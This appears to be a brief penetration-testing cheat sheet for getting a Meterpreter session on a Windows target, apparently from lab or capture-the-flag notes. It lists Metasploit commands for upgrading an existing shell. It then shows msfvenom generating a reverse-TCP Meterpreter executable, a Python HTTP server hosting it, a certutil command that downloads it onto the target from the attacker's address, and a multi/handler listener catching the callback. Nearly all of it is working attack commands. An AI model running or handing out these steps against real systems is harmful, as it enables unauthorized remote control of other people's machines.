### METHOD 1:

#### SPAWNING A METERPRETER SHELL

1. Background the current session.
2. Then load the following module

```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.10.10
run
```

3. OR you can use a single command

```
sessions -u "SESSION ID"
```
#### METHOD 2:

```
#Generating Meterpreter revrse tcp payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234   -f exe > meterpreter.exe
```

```
#Hosting Local HTTP server
python3 -m http.server 80
```

```
#Downloading payload to target
certutil -urlcache -f http://10.10.12.2/meterpreter.exe meterpreter.exe
```

#### SETTING UP LISTENER:

```
use multi/handler
set LHOST 10.10.12.2
set LPORT 1234
set payload windows/meterpreter/reverse_tcp
run
```
